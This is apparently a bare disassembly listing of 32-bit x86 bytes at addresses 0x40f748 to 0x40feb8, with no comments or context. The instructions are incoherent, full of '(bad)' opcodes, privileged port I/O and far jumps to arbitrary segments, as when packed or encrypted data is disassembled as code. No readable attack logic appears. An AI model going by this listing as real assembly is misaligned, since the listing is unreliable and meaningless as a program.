  40f748:	mov    fs,eax
  40f74a:	mov    ebx,0xec1b9c0f
  40f74f:	and    eax,0x17cd11d5
  40f754:	neg    DWORD PTR [edi+eiz*2]
  40f757:	rol    DWORD PTR [ecx-0x1c4f01fa],0x86
  40f75e:	sbb    DWORD PTR [eax-0xb],0xffffffbf
  40f762:	sbb    dh,ah
  40f764:	cmp    DWORD PTR [ecx+0xc],ecx
  40f767:	dec    esi
  40f768:	scas   al,BYTE PTR es:[edi]
  40f769:	bound  edi,QWORD PTR [edi]
  40f76b:	mov    esi,0x312e0353
  40f770:	sar    DWORD PTR ss:[esi-0x6b42d7ab],0xfb
  40f778:	sbb    BYTE PTR [edi-0x57830abf],0x4a
  40f77f:	(bad)  
  40f780:	icebp  
  40f781:	pushf  
  40f782:	call   0xd13b3a3c
  40f787:	mov    edx,DWORD PTR [ecx-0x5f]
  40f78a:	lds    ecx,FWORD PTR [ebp-0x21]
  40f78d:	cmc    
  40f78e:	stos   DWORD PTR es:[edi],eax
  40f78f:	or     BYTE PTR [eax+0x10],0xb4
  40f793:	inc    edi
  40f794:	adc    BYTE PTR [ebx+0x56d5ed79],0x6c
  40f79b:	cmc    
  40f79c:	push   ds
  40f79d:	sub    eax,0xe7d76859
  40f7a2:	jne    0x40f7f5
  40f7a4:	jne    0x40f7b6
  40f7a6:	test   BYTE PTR [esi+ebx*1+0x529e464d],dh
  40f7ad:	push   ds
  40f7ae:	dec    edx
  40f7af:	sbb    al,0xe4
  40f7b1:	lahf   
  40f7b2:	and    eax,0xf73c602f
  40f7b7:	adc    ch,BYTE PTR [esi+0x73]
  40f7ba:	test   BYTE PTR ss:[ecx],bh
  40f7bd:	test   esi,esp
  40f7bf:	jns    0x40f82c
  40f7c1:	jmp    0x40f7b2
  40f7c3:	mov    edx,0x8711b2ba
  40f7c8:	cmp    al,0xc9
  40f7ca:	fsub   QWORD PTR [ebx-0x37]
  40f7cd:	(bad)  
  40f7ce:	js     0x40f813
  40f7d0:	aaa    
  40f7d1:	mov    es,esp
  40f7d3:	cdq    
  40f7d4:	por    mm0,QWORD PTR [eax]
  40f7d7:	add    eax,0x359a9887
  40f7dc:	and    BYTE PTR [ecx+0x845f165],al
  40f7e2:	cmp    dl,bl
  40f7e4:	xor    BYTE PTR [ecx],ch
  40f7e6:	out    0x2b,al
  40f7e8:	mov    edx,0x93e8ffe3
  40f7ed:	rol    BYTE PTR [ecx],0x45
  40f7f0:	add    al,0x7f
  40f7f2:	mov    esi,0xade881c9
  40f7f7:	mov    eax,0xf73aa97a
  40f7fc:	mov    ch,0x64
  40f7fe:	sbb    DWORD PTR [ecx-0x6743656b],eax
  40f804:	(bad)  
  40f805:	int    0x18
  40f807:	fs push edi
  40f809:	fdivr  DWORD PTR [ebp+0x2464764]
  40f80f:	pop    ebp
  40f810:	mov    ch,0xc1
  40f812:	mov    al,0x62
  40f814:	int    0xbe
  40f816:	das    
  40f817:	mov    eax,0x25a7b7c
  40f81c:	cli    
  40f81d:	fwait
  40f81e:	sub    ah,BYTE PTR ds:0x17bb6225
  40f824:	inc    esp
  40f825:	(bad)  
  40f826:	xor    al,0xef
  40f828:	adc    BYTE PTR [ecx-0x4d],bl
  40f82b:	inc    ebx
  40f82c:	mov    eax,0xc8400d01
  40f831:	push   esi
  40f832:	shl    BYTE PTR [esp+ecx*2+0x22],1
  40f836:	push   ebp
  40f837:	hlt    
  40f838:	inc    edi
  40f839:	retf   
  40f83a:	xor    eax,ebx
  40f83c:	add    dl,dh
  40f83e:	test   DWORD PTR [edi],ebx
  40f840:	jb     0x40f7f0
  40f842:	dec    ebp
  40f843:	add    ecx,DWORD PTR [ebx]
  40f845:	shl    al,1
  40f847:	cld    
  40f848:	pop    esi
  40f849:	jnp    0x40f8c8
  40f84b:	jno    0x40f7f9
  40f84d:	mov    DWORD PTR [ecx+ebp*4],0x6f080725
  40f854:	or     cl,BYTE PTR [ebp-0x38b27d71]
  40f85a:	icebp  
  40f85b:	outs   dx,DWORD PTR ds:[esi]
  40f85c:	push   0xffffffce
  40f85e:	inc    BYTE PTR [ebp-0x1a]
  40f861:	mov    ss,esp
  40f863:	and    bl,0x9d
  40f866:	jg     0x40f8de
  40f868:	sbb    ebp,DWORD PTR [edx+0x6e]
  40f86b:	sbb    DWORD PTR [ecx-0x2c],esp
  40f86e:	pop    esp
  40f86f:	scas   eax,DWORD PTR es:[edi]
  40f870:	loope  0x40f8b1
  40f872:	cs dec esp
  40f874:	push   eax
  40f875:	adc    eax,0x71a59b0e
  40f87a:	sbb    edi,edi
  40f87c:	cmc    
  40f87d:	xor    al,0x5b
  40f87f:	iret   
  40f880:	int3   
  40f881:	sbb    ah,BYTE PTR ds:0x83efd19d
  40f887:	hlt    
  40f888:	imul   ebp,DWORD PTR [ebx],0x33364b84
  40f88e:	ins    DWORD PTR es:[edi],dx
  40f88f:	or     bl,BYTE PTR [esi-0x15]
  40f892:	imul   ebp,DWORD PTR [ebp-0x38e9d57e],0xffffffce
  40f899:	jns    0x40f8ac
  40f89b:	jle    0x40f83f
  40f89d:	pop    esp
  40f89e:	int3   
  40f89f:	jmp    0xf032:0x3026b371
  40f8a6:	icebp  
  40f8a7:	add    al,0x74
  40f8a9:	xchg   esp,eax
  40f8aa:	btr    DWORD PTR [edx-0x78],edx
  40f8ae:	(bad)  
  40f8af:	sti    
  40f8b0:	in     eax,dx
  40f8b1:	lods   eax,DWORD PTR ds:[esi]
  40f8b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8b3:	sti    
  40f8b4:	cld    
  40f8b5:	mov    edi,0x3cf1feab
  40f8ba:	sub    cl,BYTE PTR [ebx-0x36]
  40f8bd:	xchg   ecx,eax
  40f8be:	mov    bl,bh
  40f8c0:	push   eax
  40f8c1:	sub    ah,BYTE PTR [ecx-0x72d47a3d]
  40f8c7:	and    BYTE PTR [esi+0x57eea0c8],bl
  40f8cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ce:	mov    BYTE PTR [edx],al
  40f8d0:	sbb    eax,0x7ba04dc8
  40f8d5:	test   eax,0xd0274923
  40f8da:	ins    BYTE PTR es:[edi],dx
  40f8db:	dec    eax
  40f8dc:	adc    BYTE PTR [ebp-0x6a88e9de],al
  40f8e2:	test   dl,0xd4
  40f8e5:	fwait
  40f8e6:	xor    bh,ah
  40f8e8:	xchg   DWORD PTR [esp+edx*2-0x32],ecx
  40f8ec:	fimul  DWORD PTR [esi+0x1c674c83]
  40f8f2:	fld    DWORD PTR [edx-0xb4efa7f]
  40f8f8:	pop    ebp
  40f8f9:	sbb    ebp,DWORD PTR [ebp+0x32]
  40f8fc:	test   BYTE PTR [edx+0x3b9f699d],0xcc
  40f903:	mov    bl,0x24
  40f905:	fst    DWORD PTR [ebp+0x4ade7302]
  40f90b:	push   esi
  40f90c:	cs sti 
  40f90e:	push   esi
  40f90f:	xlat   BYTE PTR ds:[ebx]
  40f910:	and    al,0x76
  40f912:	inc    esp
  40f913:	mov    edi,0x83e10f70
  40f918:	repnz or ebx,DWORD PTR ds:0x84fc7154
  40f91f:	push   ss
  40f920:	push   0x33
  40f922:	sub    BYTE PTR [bp+di],cl
  40f925:	out    dx,al
  40f926:	and    eax,DWORD PTR [esi+0x21]
  40f929:	in     al,dx
  40f92a:	iret   
  40f92b:	(bad)  
  40f92c:	fisub  WORD PTR [ebx-0x2a]
  40f92f:	fisubr WORD PTR [esi]
  40f931:	mov    esi,0x152bf632
  40f936:	push   esp
  40f937:	out    0xb8,eax
  40f939:	mov    dl,BYTE PTR [edx+0x16a40afb]
  40f93f:	adc    BYTE PTR ss:[ecx+0x74],0xea
  40f944:	cmp    DWORD PTR [ebx+0x52],ebx
  40f947:	popf   
  40f948:	xchg   ebx,eax
  40f949:	mov    bl,dl
  40f94b:	inc    edx
  40f94c:	sahf   
  40f94d:	jl     0x40f90d
  40f94f:	hlt    
  40f950:	lock sbb al,0xb0
  40f953:	xor    BYTE PTR [ecx+ecx*8],dh
  40f956:	dec    ecx
  40f957:	mov    al,ds:0x9e982de9
  40f95c:	and    ebp,DWORD PTR ds:0xfe4a745f
  40f962:	mov    ebx,0xe70e80a4
  40f967:	mov    esi,DWORD PTR [eax]
  40f969:	sub    bl,cl
  40f96b:	cmp    al,0xf3
  40f96d:	jns    0x40f93c
  40f96f:	dec    esp
  40f970:	jecxz  0x40f9a5
  40f972:	mov    WORD PTR [edi+0x31dc771a],ss
  40f978:	mov    esp,0xf5737ce5
  40f97d:	jge    0x40f993
  40f97f:	scas   eax,DWORD PTR es:[edi]
  40f980:	es push 0xffffffdb
  40f983:	sub    al,ch
  40f985:	leave  
  40f986:	sbb    al,0x3
  40f988:	cld    
  40f989:	mov    ?,WORD PTR [ebx-0x5e75406b]
  40f98f:	repnz and edi,DWORD PTR [ebp+esi*1+0x1133f985]
  40f997:	mov    ds:0x4e5a46e8,eax
  40f99c:	inc    esp
  40f99d:	jnp    0x40f9d9
  40f99f:	fs scas eax,DWORD PTR es:[edi]
  40f9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a2:	jmp    0xa650f21b
  40f9a7:	(bad)  
  40f9a8:	sbb    DWORD PTR [ecx],edx
  40f9aa:	out    dx,al
  40f9ab:	in     eax,0x95
  40f9ad:	add    ebp,DWORD PTR [esi]
  40f9af:	jnp    0x40f95b
  40f9b1:	jbe    0x40fa0d
  40f9b3:	in     al,0xd9
  40f9b5:	fnstsw WORD PTR [ecx-0x5e]
  40f9b8:	fisttp WORD PTR [eax]
  40f9ba:	sbb    bh,ch
  40f9bc:	mov    bl,0x9
  40f9be:	pop    ebx
  40f9bf:	or     eax,0xcc75ecd0
  40f9c4:	fwait
  40f9c5:	test   DWORD PTR [ebp+0x7d28a1b1],ebx
  40f9cb:	inc    esp
  40f9cc:	sub    DWORD PTR [edi+0x380566d9],ebx
  40f9d2:	sbb    ecx,DWORD PTR [ecx]
  40f9d4:	bound  esp,QWORD PTR [edx+0x28334e62]
  40f9da:	add    eax,0xdd435470
  40f9df:	sar    ebx,1
  40f9e1:	and    al,0x30
  40f9e3:	ins    BYTE PTR es:[edi],dx
  40f9e4:	mov    cl,0xc2
  40f9e6:	jecxz  0x40f9f7
  40f9e8:	jecxz  0x40fa5e
  40f9ea:	outs   dx,DWORD PTR ds:[esi]
  40f9eb:	call   0x5259:0xc5ad3545
  40f9f2:	cmp    edi,ebx
  40f9f4:	mov    eax,0xc06f693e
  40f9f9:	enter  0x9915,0x84
  40f9fd:	ins    DWORD PTR es:[edi],dx
  40f9fe:	inc    ebx
  40f9ff:	pop    edx
  40fa00:	bound  eax,QWORD PTR [edx-0x16f44f24]
  40fa06:	sub    ch,BYTE PTR [edi]
  40fa08:	arpl   WORD PTR ds:0x94c6bb49,bx
  40fa0e:	xor    esi,DWORD PTR [edi+ecx*4+0x34]
  40fa12:	xor    esi,DWORD PTR [eax-0x4f]
  40fa15:	or     bl,BYTE PTR [edi-0x6e]
  40fa18:	jge    0x40fa7b
  40fa1a:	mov    esi,0x975b1f1c
  40fa1f:	das    
  40fa20:	stos   BYTE PTR es:[edi],al
  40fa21:	mov    al,ds:0xbdd87ebd
  40fa26:	out    0xaf,al
  40fa28:	(bad)  
  40fa29:	popf   
  40fa2a:	repz inc edi
  40fa2c:	mov    cs,esp
  40fa2e:	das    
  40fa2f:	adc    ebx,DWORD PTR [esi+0x48]
  40fa32:	mov    dh,0x2e
  40fa34:	dec    esp
  40fa35:	mov    bh,0x4d
  40fa37:	leave  
  40fa38:	mov    ebx,0xa9ca6189
  40fa3d:	mov    BYTE PTR [ebp+0x597bf710],0x80
  40fa44:	inc    ebx
  40fa45:	and    cl,dh
  40fa47:	outs   dx,BYTE PTR ds:[esi]
  40fa48:	popf   
  40fa49:	shl    DWORD PTR [esi+0x2835edf5],cl
  40fa4f:	adc    esp,esp
  40fa51:	addr16 ret 0x8195
  40fa55:	loope  0x40fad6
  40fa57:	xor    BYTE PTR [esi+0x40170d82],ch
  40fa5d:	jmp    0x57f7:0xecf11bd9
  40fa64:	push   eax
  40fa65:	data16 jmp 0x40fabe
  40fa68:	iret   
  40fa69:	cmp    dl,BYTE PTR [ecx+ebx*2-0x21277dfc]
  40fa70:	jp     0x40facf
  40fa72:	sahf   
  40fa73:	adc    DWORD PTR [edi],esi
  40fa75:	or     BYTE PTR [ebp+0x575d90af],al
  40fa7b:	jecxz  0x40fa0a
  40fa7d:	pop    es
  40fa7e:	aaa    
  40fa7f:	or     eax,0x857a20b8
  40fa84:	in     al,0xbf
  40fa86:	clc    
  40fa87:	adc    eax,0x378f4f86
  40fa8c:	cmp    eax,0x5c019f7
  40fa91:	cwde   
  40fa92:	dec    edx
  40fa93:	jle    0x40fa2f
  40fa95:	lds    esi,FWORD PTR [edi-0x47]
  40fa98:	jmp    0x656e:0x65bc22dd
  40fa9f:	fldcw  WORD PTR [esi+eiz*1+0x4b]
  40faa3:	int3   
  40faa4:	ja     0x40fabc
  40faa6:	add    DWORD PTR [ebx+0x117c8456],ebx
  40faac:	ja     0x40fa79
  40faae:	push   es
  40faaf:	loopne 0x40fa51
  40fab1:	aaa    
  40fab2:	or     BYTE PTR [edx],ch
  40fab4:	rcr    dl,cl
  40fab6:	fst    st(5)
  40fab8:	dec    ecx
  40fab9:	push   ss
  40faba:	ret    0x1f54
  40fabd:	lods   al,BYTE PTR ds:[esi]
  40fabe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fabf:	es in  al,0x14
  40fac2:	and    al,0xb3
  40fac4:	test   al,0xc
  40fac6:	pop    esp
  40fac7:	jbe    0x40fabd
  40fac9:	xchg   ebp,eax
  40faca:	mov    eax,0x21ecae0b
  40facf:	adc    DWORD PTR [eax+0x31],0x600ec68f
  40fad6:	add    dh,BYTE PTR [edi-0x3e22e633]
  40fadc:	cmp    cl,BYTE PTR [ebx]
  40fade:	dec    ebp
  40fadf:	(bad)
  40fae2:	fstp   QWORD PTR [ebp+0x388d8e6d]
  40fae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fae9:	sub    ebx,DWORD PTR [edx+0x7a]
  40faec:	push   es
  40faed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faee:	xchg   ecx,eax
  40faef:	or     eax,0x6ba08749
  40faf4:	loop   0x40fb20
  40faf6:	mov    ah,0x7d
  40faf8:	jg     0x40fb37
  40fafa:	neg    BYTE PTR [ebx-0x16]
  40fafd:	cld    
  40fafe:	lahf   
  40faff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb00:	es mov esi,0xa12115e4
  40fb06:	push   es
  40fb07:	out    0x7c,eax
  40fb09:	sti    
  40fb0a:	xor    BYTE PTR [esi],dl
  40fb0c:	pop    ebp
  40fb0d:	test   al,0xc1
  40fb0f:	idiv   BYTE PTR [esi]
  40fb11:	test   BYTE PTR [ecx-0xf],0x19
  40fb15:	push   es
  40fb16:	lock cwde 
  40fb18:	aas    
  40fb19:	hlt    
  40fb1a:	cwde   
  40fb1b:	in     eax,dx
  40fb1c:	rol    BYTE PTR [esi+0x46503435],1
  40fb22:	xchg   esp,eax
  40fb23:	icebp  
  40fb24:	mov    edx,0x37267612
  40fb29:	std    
  40fb2a:	(bad)  
  40fb2b:	es xor esp,esp
  40fb2e:	or     ebx,esi
  40fb30:	cwde   
  40fb31:	inc    edi
  40fb32:	and    ch,bl
  40fb34:	int3   
  40fb35:	inc    eax
  40fb36:	and    BYTE PTR [edx],dl
  40fb38:	jmp    0x5cd:0x7b36c95f
  40fb3f:	and    edi,DWORD PTR [ecx]
  40fb41:	dec    ebx
  40fb42:	inc    esi
  40fb43:	out    dx,al
  40fb44:	inc    eax
  40fb45:	and    DWORD PTR [eax],esp
  40fb47:	inc    eax
  40fb48:	mov    esp,ebx
  40fb4a:	add    al,0xe0
  40fb4c:	sbb    al,0xbc
  40fb4e:	inc    edi
  40fb4f:	dec    eax
  40fb50:	pop    edx
  40fb51:	addr16 call 0xcca19b6d
  40fb57:	pop    esp
  40fb58:	fimul  WORD PTR [eax-0x2e8516f8]
  40fb5e:	sub    ecx,DWORD PTR es:[ebx-0x65]
  40fb62:	adc    DWORD PTR [eiz*4-0x6365de95],esi
  40fb69:	dec    edi
  40fb6a:	lock fcom DWORD PTR [edx-0x3d]
  40fb6e:	pop    ds
  40fb6f:	in     eax,dx
  40fb70:	scas   eax,DWORD PTR es:[edi]
  40fb71:	push   cs
  40fb72:	retf   0x501b
  40fb75:	or     al,0x3b
  40fb77:	adc    ebx,DWORD PTR [esi+0x6a49eff5]
  40fb7d:	scas   al,BYTE PTR es:[edi]
  40fb7e:	pusha  
  40fb7f:	mov    ebx,0x1342bfc
  40fb84:	(bad)  
  40fb85:	call   0x88008deb
  40fb8a:	adc    ebx,edx
  40fb8c:	sub    BYTE PTR [edi],ah
  40fb8e:	jb     0x40fb69
  40fb90:	pusha  
  40fb91:	add    ebp,esi
  40fb93:	outs   dx,BYTE PTR ds:[esi]
  40fb94:	addr16 xor esi,edi
  40fb97:	imul   DWORD PTR [ecx]
  40fb99:	mov    bl,0x76
  40fb9b:	sbb    al,0x28
  40fb9d:	imul   edx,DWORD PTR ds:0x4e889bcd,0xe8539a5a
  40fba8:	in     eax,0xad
  40fbaa:	out    dx,al
  40fbab:	xchg   edx,eax
  40fbac:	add    al,0x2f
  40fbae:	mov    bl,0x1f
  40fbb0:	xchg   ecx,eax
  40fbb1:	lods   eax,DWORD PTR ds:[esi]
  40fbb2:	dec    edx
  40fbb3:	push   ebx
  40fbb4:	aad    0xfb
  40fbb6:	mov    ah,BYTE PTR [eax+esi*4]
  40fbb9:	imul   ecx,DWORD PTR [esi],0xffffff8f
  40fbbc:	xchg   esi,eax
  40fbbd:	mov    eax,0x162c6519
  40fbc2:	pop    edx
  40fbc3:	push   0xba5ac2ab
  40fbc8:	gs jo  0x40fb89
  40fbcb:	ss je  0x40fbf9
  40fbce:	cmp    ebx,DWORD PTR [edx+0x2f]
  40fbd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbd2:	cli    
  40fbd3:	inc    ecx
  40fbd4:	pop    ebp
  40fbd5:	cmc    
  40fbd6:	jmp    0xe1e0503d
  40fbdb:	sub    ecx,edx
  40fbdd:	sub    bl,BYTE PTR [ebx+eax*2]
  40fbe0:	xor    bl,BYTE PTR ds:0x71c927b0
  40fbe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe7:	cwde   
  40fbe8:	retf   
  40fbe9:	jnp    0x40fc29
  40fbeb:	icebp  
  40fbec:	lods   eax,DWORD PTR ds:[esi]
  40fbed:	popf   
  40fbee:	mov    al,0x87
  40fbf0:	jb     0x40fc64
  40fbf2:	mov    esi,0xa04e4013
  40fbf7:	rep lods al,BYTE PTR ds:[esi]
  40fbf9:	leave  
  40fbfa:	loope  0x40fc21
  40fbfc:	fwait
  40fbfd:	fs enter 0x8912,0xf6
  40fc02:	cwde   
  40fc03:	lock into 
  40fc05:	dec    eax
  40fc06:	dec    edi
  40fc07:	jns    0x40fc60
  40fc09:	rcl    ecx,0xe
  40fc0c:	push   esi
  40fc0d:	int3   
  40fc0e:	lods   al,BYTE PTR ds:[esi]
  40fc0f:	sbb    al,0x38
  40fc11:	xchg   BYTE PTR [eax+esi*2-0x49],cl
  40fc15:	es inc esp
  40fc17:	stos   BYTE PTR es:[edi],al
  40fc18:	xor    ch,bl
  40fc1a:	es jp  0x40fc28
  40fc1d:	adc    ah,BYTE PTR [eax+0x66]
  40fc20:	sub    DWORD PTR [eax-0xd53cf3c],edx
  40fc26:	popf   
  40fc27:	test   ch,0x4c
  40fc2a:	je     0x40fc52
  40fc2c:	jb     0x40fbe7
  40fc2e:	rcr    BYTE PTR [ebx],0x1c
  40fc31:	je     0x40fc0a
  40fc33:	ret    
  40fc34:	lds    esi,FWORD PTR [edi+0x24edc7a0]
  40fc3a:	in     al,dx
  40fc3b:	ins    BYTE PTR es:[edi],dx
  40fc3c:	cmc    
  40fc3d:	fs in  al,dx
  40fc3f:	icebp  
  40fc40:	jns    0x40fc42
  40fc42:	xor    ch,BYTE PTR [ebx]
  40fc44:	cld    
  40fc45:	cmp    al,0xb6
  40fc47:	sbb    DWORD PTR [ebx],edx
  40fc49:	xor    bl,ch
  40fc4b:	lds    ebp,FWORD PTR ds:[ebx-0xfb12608]
  40fc52:	push   ebx
  40fc53:	pop    eax
  40fc54:	pop    edx
  40fc55:	jb     0x40fc04
  40fc57:	jmp    0x40fca8
  40fc59:	jnp    0x40fc85
  40fc5b:	lock mov BYTE PTR [edi-0xd73d2e0],dl
  40fc62:	xchg   DWORD PTR [edx+0x50a884b3],ecx
  40fc68:	mov    ?,WORD PTR [edi-0x13]
  40fc6b:	mov    ds:0x45782a6b,al
  40fc70:	fs dec edx
  40fc72:	imul   ecx,DWORD PTR [eax-0xb782f31],0x51
  40fc79:	fmul   DWORD PTR [edx+0x21]
  40fc7c:	(bad)  
  40fc7d:	icebp  
  40fc7e:	dec    ebp
  40fc7f:	adc    eax,0x8316fb27
  40fc84:	(bad)  
  40fc85:	imul   esp,ebp,0x47
  40fc88:	sbb    DWORD PTR [esi-0x2b],ebx
  40fc8b:	rcr    BYTE PTR [edi+0x18038d28],0xdb
  40fc92:	adc    ch,BYTE PTR [ecx-0x6396c123]
  40fc98:	mov    eax,0x7b947bc3
  40fc9d:	sbb    DWORD PTR [ebp+0x42462cb9],ecx
  40fca3:	dec    ebx
  40fca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fca5:	test   DWORD PTR ds:[ecx+esi*4-0x71b94204],edx
  40fcad:	or     edx,DWORD PTR [esi+0x23]
  40fcb0:	inc    BYTE PTR [edx+eax*4-0x6e5e9449]
  40fcb7:	mov    dh,0xf3
  40fcb9:	adc    ah,BYTE PTR [edi]
  40fcbb:	and    DWORD PTR [ecx],0x6b21dfb9
  40fcc1:	mov    bl,0x5b
  40fcc3:	xor    eax,edi
  40fcc5:	sti    
  40fcc6:	adc    al,BYTE PTR [edi+edx*1+0x18]
  40fcca:	add    eax,0xdfab7d63
  40fccf:	call   0x5223:0xc0499e07
  40fcd6:	jo     0x40fcbe
  40fcd8:	std    
  40fcd9:	ins    BYTE PTR es:[edi],dx
  40fcda:	fistp  WORD PTR [ecx+eiz*1]
  40fcdd:	sahf   
  40fcde:	imul   eax,DWORD PTR [ebx-0x1],0x709f881b
  40fce5:	aad    0xa9
  40fce7:	call   0xbb57c1ec
  40fcec:	xor    eax,0xdd05c497
  40fcf1:	mov    ch,0xa4
  40fcf3:	fisttp DWORD PTR [ebx]
  40fcf5:	cmp    eax,0x2f6a9679
  40fcfa:	clc    
  40fcfb:	in     eax,dx
  40fcfc:	or     dl,cl
  40fcfe:	in     al,0xf9
  40fd00:	mov    edx,0x18e9e327
  40fd05:	adc    BYTE PTR [edi],cl
  40fd07:	arpl   WORD PTR [ebp+0x45],si
  40fd0a:	out    dx,eax
  40fd0b:	cmp    edi,DWORD PTR [ebx-0x16a1b171]
  40fd11:	(bad)
  40fd16:	clc    
  40fd17:	pop    edx
  40fd18:	call   0xe4ec:0xa0c0ec55
  40fd1f:	(bad)  
  40fd20:	imul   edx,ecx,0xffffff8e
  40fd23:	push   edx
  40fd24:	mov    esi,0x59d6652b
  40fd29:	ins    BYTE PTR es:[edi],dx
  40fd2a:	fdiv   st,st(2)
  40fd2c:	popf   
  40fd2d:	rol    eax,cl
  40fd2f:	enter  0xfb8f,0xe
  40fd33:	push   ss
  40fd34:	pop    es
  40fd35:	adc    ebx,DWORD PTR [ebx+0x4f]
  40fd38:	leave  
  40fd39:	sar    BYTE PTR [edx-0x43da3d99],cl
  40fd3f:	stos   DWORD PTR es:[edi],eax
  40fd40:	or     al,0xd4
  40fd42:	jmp    0x9a26:0x4303615e
  40fd49:	jae    0x40fd1f
  40fd4b:	pop    eax
  40fd4c:	jp     0x40fd30
  40fd4e:	aam    0xa4
  40fd50:	dec    BYTE PTR [edx-0x3a]
  40fd53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd54:	repnz cmp ebp,DWORD PTR [edi+0x5887c7fd]
  40fd5b:	xchg   ebx,eax
  40fd5c:	pop    esp
  40fd5d:	rol    BYTE PTR [edi],0x44
  40fd60:	stos   BYTE PTR es:[edi],al
  40fd61:	sbb    ebp,0x5d81547f
  40fd67:	cdq    
  40fd68:	sbb    DWORD PTR [esi],ecx
  40fd6a:	stos   DWORD PTR es:[edi],eax
  40fd6b:	sub    bl,BYTE PTR [eax-0x61bab8ff]
  40fd71:	scas   al,BYTE PTR es:[edi]
  40fd72:	xchg   ebp,eax
  40fd73:	in     eax,dx
  40fd74:	je     0x40fd64
  40fd76:	push   0x39ee6ef5
  40fd7b:	ret    0x47b
  40fd7e:	cmp    esp,DWORD PTR [bx+di-0x31]
  40fd83:	pusha  
  40fd84:	addr16 xchg edx,eax
  40fd86:	mov    edi,0xc8005832
  40fd8b:	int3   
  40fd8c:	mov    esi,0xc27ec706
  40fd91:	dec    esi
  40fd92:	pop    ecx
  40fd93:	fnstenv [ebx-0x2e]
  40fd96:	in     eax,dx
  40fd97:	mov    edx,0x261d1c20
  40fd9c:	and    dh,BYTE PTR [ebx-0xce2ae5a]
  40fda2:	in     eax,dx
  40fda3:	inc    ebp
  40fda4:	in     eax,0x10
  40fda6:	das    
  40fda7:	dec    ebp
  40fda8:	lahf   
  40fda9:	xchg   edx,eax
  40fdaa:	ret    
  40fdab:	push   esi
  40fdac:	mov    fs,WORD PTR [di]
  40fdaf:	imul   esi,DWORD PTR [esi-0x2b1d9cbd],0x32
  40fdb6:	std    
  40fdb7:	add    DWORD PTR [edx+0x50],0xafc69de7
  40fdbe:	jg     0x40fe0c
  40fdc0:	ins    DWORD PTR es:[edi],dx
  40fdc1:	xor    ch,0xec
  40fdc4:	cmp    ebp,DWORD PTR [ebp+0x1accbb19]
  40fdca:	loopne 0x40fe3e
  40fdcc:	bound  edi,QWORD PTR [ecx-0x5d]
  40fdcf:	xchg   ebp,eax
  40fdd0:	fild   DWORD PTR [edx+0x282882e8]
  40fdd6:	test   ebp,ebp
  40fdd8:	lock sub al,0xb5
  40fddb:	stc    
  40fddc:	jno    0x40fdd0
  40fdde:	inc    esp
  40fddf:	js     0x40fe38
  40fde1:	add    al,0x42
  40fde3:	(bad)  
  40fde4:	sub    dl,BYTE PTR [ebp-0x8]
  40fde7:	xor    BYTE PTR [edx-0x7d],0xf
  40fdeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdec:	add    eax,0x5521b0f9
  40fdf1:	jns    0x40fe46
  40fdf3:	push   ecx
  40fdf4:	xchg   ecx,eax
  40fdf5:	jno    0x40fd8a
  40fdf7:	in     eax,dx
  40fdf8:	icebp  
  40fdf9:	loop   0x40fe03
  40fdfb:	call   0xfc31b986
  40fe00:	pop    ecx
  40fe01:	mov    al,BYTE PTR [ebx-0x3aabbc93]
  40fe07:	push   0x65
  40fe09:	cmp    al,BYTE PTR [eax+0x4f4760a0]
  40fe0f:	ret    0x1dcb
  40fe12:	retf   0xe4fe
  40fe15:	daa    
  40fe16:	je     0x40fe5a
  40fe18:	and    ebx,DWORD PTR [edx+0x6b9b0015]
  40fe1e:	cld    
  40fe1f:	push   ebp
  40fe20:	sub    BYTE PTR [ebx],0x4e
  40fe23:	adc    ch,dl
  40fe25:	cmc    
  40fe26:	push   esp
  40fe28:	add    DWORD PTR [ecx-0x25871847],esp
  40fe2e:	ins    BYTE PTR es:[edi],dx
  40fe2f:	fdiv   QWORD PTR [edx+0x51b0fbf2]
  40fe35:	fld    TBYTE PTR [esi+0x7b2e6e16]
  40fe3b:	pop    eax
  40fe3c:	dec    DWORD PTR [esi]
  40fe3e:	mov    ebp,0x598abb41
  40fe43:	and    ebp,DWORD PTR [edx+eiz*8-0x37]
  40fe47:	retf   0x175b
  40fe4a:	and    al,0xac
  40fe4c:	push   eax
  40fe4d:	xchg   edi,eax
  40fe4e:	adc    DWORD PTR [edx-0x6d],0x7b3bbe3b
  40fe55:	pop    edi
  40fe56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe57:	js     0x40fdfa
  40fe59:	xchg   BYTE PTR [edi+0x63],cl
  40fe5c:	dec    ecx
  40fe5d:	call   0xd58ee934
  40fe62:	pop    ebx
  40fe63:	icebp  
  40fe64:	loopne 0x40fe6e
  40fe66:	ja     0x40fec0
  40fe68:	mov    cl,0x5e
  40fe6a:	mov    BYTE PTR [edi-0x4a],bl
  40fe6d:	or     eax,0xd1734d99
  40fe72:	bound  ebp,QWORD PTR [ecx+edx*1]
  40fe75:	and    eax,0x493f7615
  40fe7a:	pop    eax
  40fe7b:	test   al,0x6f
  40fe7d:	pop    ecx
  40fe7e:	in     al,0x79
  40fe80:	mov    cl,0xed
  40fe82:	aad    0x5e
  40fe84:	loopne 0x40fe4b
  40fe86:	in     al,0x2d
  40fe88:	mov    edi,0xc7cf72bb
  40fe8d:	rol    BYTE PTR [edx+0x1],cl
  40fe90:	dec    ebx
  40fe91:	mov    al,0x3d
  40fe93:	inc    esp
  40fe94:	mul    BYTE PTR [ebp*1-0x57df261c]
  40fe9b:	loopne 0x40fe79
  40fe9d:	in     al,0x4e
  40fe9f:	inc    ebx
  40fea0:	jbe    0x40fe81
  40fea2:	stos   BYTE PTR es:[edi],al
  40fea3:	or     eax,0x2bbab889
  40fea8:	pushf  
  40fea9:	lock dec ecx
  40feab:	call   0xf8630d4
  40feb0:	bound  ebp,QWORD PTR [edx+0x2c1a07b5]
  40feb6:	add    dl,al
  40feb8:	fdiv   QWORD PTR ds:[esi+edi*8-0x2]
